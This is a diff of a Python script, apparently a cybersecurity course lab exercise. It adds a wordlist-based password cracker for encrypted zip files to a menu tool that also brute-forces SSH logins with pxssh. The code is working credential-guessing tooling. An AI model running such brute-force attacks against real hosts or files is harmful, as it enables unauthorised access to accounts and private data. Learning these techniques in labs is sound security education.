@@ -1,17 +1,50 @@
 #!/usr/bin/env python3
 
-# Script:                   401 Op Challenge Day 17
+# Script:                   401 Op Challenge Day 18
 # Author:                   Courtney Hans
-# Date of latest revision:  10/27/20
-# Purpose:                  Automated Brute Force Wordlist Attack Tool (1 of 3)
+# Date of latest revision:  10/28/20
+# Purpose:                  Automated Brute Force Attack Tool (3 of 3)
 
 # Import libraries
 from pexpect import pxssh
 import time, getpass, sys
+from zipfile import ZipFile
 
 # Declare variables
 
 # Declare functions
+
+def crack_file():
+    the_file = input("Enter the file (w/ filepath) you wish to decrypt:  ")
+    #the_file = '/home/osboxes/Desktop/lab18princess.zip' # test file
+    filepath = input("Enter your dictionary filepath:  ")
+    #filepath = '/home/osboxes/Desktop/rockyou2.txt' #test dictionary filepath
+    file = open(filepath, encoding = "ISO-8859-1") # address encoding problem
+    line = file.readline()
+    success = "no"
+    if success == "no":
+        while line:
+            line = line.rstrip()
+            password = line
+            print(f"Checking '{password}'...")
+
+            try:
+                with ZipFile(the_file) as zf:
+                    zf.extractall(pwd=bytes(password,'utf-8'), path='/home/osboxes/Desktop')
+                success = "yes"
+                print(f"[*] File decrypted with '{password}' - returning to menu. [*]")
+                break
+
+            except:
+                pass
+           
+            time.sleep(.5)
+            line = file.readline()
+
+        file.close()
+    else:
+        exit
+
 
 def iterator():
     host = input("Enter target host:  ")
@@ -42,7 +75,7 @@ def iterator():
                 print((s.before).decode())
                 s.logout()
                 success = "yes"
-                print("[*] Mission accomplished, returning to menu.")
+                print("[*] Mission accomplished, returning to menu. [*]")
                 break
 
             except pxssh.ExceptionPxssh as e:
@@ -90,25 +123,28 @@ def check_password():
     t2 = time.time()
     print("\nTime taken to scan: %.6f" %(t2 - t1))
 
+
 # Main
 
 if __name__ == "__main__": # when my computer runs this file...do this stuff
     while True:
         mode = input("""
 Brue Force Wordlist Attack Tool Menu
-1 - Offensive, Dictionary Iterator
-2 - Defensive, Password Recognized
-3 - Exit
+1 - Offensive, Dictionary Iterator for ssh access
+2 - Offensive, Dictionary Iterator to decrypt a password-locked file
+3 - Defensive, Password Recognized
+4 - Exit
     Please enter a number: 
 """)
-        if (mode == "1"):
+        if mode == "1":
             iterator()
-        elif (mode == "2"):
+        elif mode == "2":
+            crack_file()
+        elif mode == "3":
             check_password()
-        elif (mode == '3'):
+        elif mode == '4':
             break
         else:
-            print("Invalid selection...") 
+            print("Invalid selection, returning to menu...") 
 
-# resource: https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
 # End
